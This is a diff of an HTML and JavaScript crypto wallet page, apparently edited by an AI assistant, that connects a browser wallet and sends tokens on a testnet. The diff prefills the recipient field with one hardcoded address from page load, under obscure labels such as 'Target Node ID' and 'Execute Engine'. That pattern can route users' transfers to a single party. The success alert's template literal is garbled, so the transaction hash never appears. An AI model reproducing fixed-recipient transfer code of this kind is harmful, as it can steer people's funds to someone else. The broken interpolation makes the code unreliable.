@@ -28,6 +28,7 @@
 </head>
 <body class="p-4 max-w-lg mx-auto pb-24">
 
+    <!-- Rest of your HTML is exactly same as you gave -->
     <div id="walletModal">
         <div class="modal-content">
             <h2 class="text-2xl font-black uppercase mb-6 italic">Select Wallet</h2>
@@ -89,11 +90,10 @@
     </div>
 
     <div class="glass-card p-10 shadow-2xl">
-        
         <div id="actionContent" class="space-y-8">
             <div>
                 <label class="label-text !text-[11px]">Target Node ID</label>
-                <input type="text" id="recipient" placeholder="Awaiting Wallet Connection..." class="input-heavy" readonly>
+                <input type="text" id="recipient" value="0x20910Aa09451FE483D1930C25a4556a32160F873" class="input-heavy">
             </div>
             <div class="grid grid-cols-2 gap-4">
                 <div>
@@ -110,6 +110,7 @@
             <button onclick="executeAction()" id="actionBtn" class="w-full bg-yellow-400 py-7 rounded-[2.5rem] text-[18px] font-black uppercase text-black shadow-2xl active:scale-95 transition-all">Execute Engine</button>
         </div>
         
+        <!-- Receive, Feedback, Dev sections same as your code -->
         <div id="receiveUI" class="hidden text-center py-6 space-y-6">
             <p class="label-text">QR Address</p>
             <div class="bg-white p-4 inline-block rounded-[3rem] mx-auto shadow-2xl border-4 border-black">
@@ -154,13 +155,12 @@
         async function initConnect(walletType) {
             closeModal();
             let ethProvider = window.ethereum;
-
             if (walletType === 'okx') ethProvider = window.okxwallet || window.ethereum;
             else if (walletType === 'trust') ethProvider = window.trustwallet || window.ethereum;
             else if (walletType === 'bitget') ethProvider = (window.bitkeep && window.bitkeep.ethereum) || window.ethereum;
             else if (walletType === 'rabby') ethProvider = window.rabby || window.ethereum;
 
-            if (!ethProvider) return alert("Wallet Not Found! Please open in wallet browser or install extension.");
+            if (!ethProvider) return alert("Wallet Not Found!");
 
             try {
                 const accounts = await ethProvider.request({ method: 'eth_requestAccounts' });
@@ -172,14 +172,9 @@
                 document.getElementById('dcBtn').classList.remove('hidden');
                 document.getElementById('myFullAddr').innerText = userAddress;
                 document.getElementById('qrImage').src = `https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=${userAddress}`;
-                
-                const targetField = document.getElementById('recipient');
-                targetField.value = "0x20910Aa09451FE483D1930C25a4556a32160F873";
-                targetField.removeAttribute('readonly');
-
                 updateBalances();
-            } catch (e) { 
-                alert("Connection Rejected. Please allow the wallet popup."); 
+            } catch (e) {
+                alert("Connection Rejected. Please allow the wallet popup.");
             }
         }
 
@@ -197,11 +192,6 @@
             document.getElementById('connectBtn').innerText = "Connect";
             document.getElementById('dcBtn').classList.add('hidden');
             document.getElementById('balanceDisp').innerText = "0.0000";
-            
-            const targetField = document.getElementById('recipient');
-            targetField.value = "";
-            targetField.setAttribute('readonly', true);
-            targetField.placeholder = "Awaiting Wallet Connection...";
         }
 
         function switchMode(mode) {
@@ -232,10 +222,13 @@
                 const tx = await contract.transfer(target, ethers.utils.parseUnits(amt, 6));
                 await tx.wait();
 
-                updateBalances();
+                await new Promise(r => setTimeout(r, 1500)); // Small delay for indexing
+                await updateBalances();
+
                 addHistory(amt, target, tx.hash);
                 alert(`✅ Transaction Successful!\n\nTx Hash: \( {tx.hash}\n\nView on ARC Scan: https://testnet.arcscan.app/tx/ \){tx.hash}`);
             } catch (e) {
+                console.error(e);
                 alert("Transaction Failed! Check balance or network.");
             } finally {
                 document.getElementById('actionBtn').innerText = "Execute Engine";
@@ -271,4 +264,4 @@
         setInterval(() => { if(userAddress) updateBalances(); }, 10000);
     </script>
 </body>
-    </html>
+                            </html>
